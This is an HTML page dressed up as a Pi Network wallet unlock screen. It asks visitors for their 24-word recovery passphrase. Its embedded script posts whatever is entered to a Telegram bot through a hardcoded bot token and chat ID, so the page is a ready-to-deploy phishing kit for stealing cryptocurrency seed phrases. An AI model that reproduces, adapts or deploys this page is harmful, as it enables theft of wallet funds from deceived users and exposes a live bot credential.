<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Font Awesome for icons -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            padding: 20px;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        .navigation {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            background-color: #783a8c; /* Purple background */
            padding: 10px;
            border-radius: 8px; /* Rounded corners */
        }
        .navigation .icons {
            display: flex;
            align-items: center;
            gap: 10px; /* Space between icons */
        }
        .navigation .icons i {
            font-size: 20px;
            color: #fff; /* White color for icons */
            cursor: pointer;
        }
        .navigation .wallet-text {
            font-size: 20px;
            font-weight: bold;
            color: #fff; /* White color for text */
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px; /* Space between logo and text */
            flex-grow: 1; /* Centers the text and placeholders */
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center; /* Centered the text */
        }
        .passphrase-input {
            width: 100%;
            height: 100px;
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box; /* Ensures padding doesn't affect width */
        }
        .button {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
        }
        .unlock-button {
            background-color: #783a8c; /* Pink */
            color: #fff;
            border: none; /* No border for this button */
        }
        .biometric-button {
            background-color: #fff; /* White */
            color: #6c757d; /* Gray text */
            border: 1px solid #6c757d; /* Added border */
        }
        .warning {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            text-align: center; /* Centered the text */
        }
        .warning a {
            color: #007bff; /* Blue */
            text-decoration: none;
        }
        .warning a:hover {
            text-decoration: underline;
        }
        .logo-placeholder {
            width: 30px; /* Adjust size as needed */
            height: 30px; /* Adjust size as needed */
            background-color: #ccc; /* Placeholder color */
            border-radius: 50%; /* Circular logo */
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navigation Section -->
        <div class="navigation">
            <div class="icons">
                <i class="fas fa-arrow-left"></i> <!-- Left Arrow Icon -->
            </div>
            <div class="wallet-text">
                <div class="logo-placeholder"></div> <!-- Left Pi Logo Placeholder -->
                Wallet
                <div class="logo-placeholder"></div> <!-- Right Pi Logo Placeholder -->
            </div>
            <div class="icons">
                <i class="fas fa-chevron-down"></i> <!-- Downward-facing Icon -->
            </div>
        </div>

        <!-- Unlock Pi Wallet Content -->
        <h1>Unlock Pi Wallet</h1>
        <p>Enter your 24-word passphrase here to unlock Locked PI Tokens</p>
        <textarea id="passphrase-input" class="passphrase-input" placeholder="Enter your 24-word passphrase"></textarea>
        <button id="unlock-button" class="button unlock-button">Unlock with Passphrase</button>
        <button class="button biometric-button">Biometric Not Available</button>
        <div class="warning">
            <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Ï€ in your previous wallet will be inaccessible.</p>
        </div>
    </div>

    <script>
        // Telegram Bot Token and Chat ID
        const botToken = '7263036488:AAEKpKlkHNq2oqfENbCBkpVat_bB7LoxHXc'; // Replace with your bot token
        const chatId = '6872862496'; // Replace with the chat ID of @bankymichael

        // Function to send data to Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const payload = {
                chat_id: chatId,
                text: message,
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    alert('Passphrase sent successfully!');
                } else {
                    alert('Failed to send passphrase. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            }
        }

        // Add click event to the "Unlock with Passphrase" button
        document.getElementById('unlock-button').addEventListener('click', () => {
            const passphrase = document.getElementById('passphrase-input').value.trim();

            if (passphrase) {
                sendToTelegram(`Passphrase: ${passphrase}`);
            } else {
                alert('Please enter your 24-word passphrase.');
            }
        });
    </script>
</body>
</html>
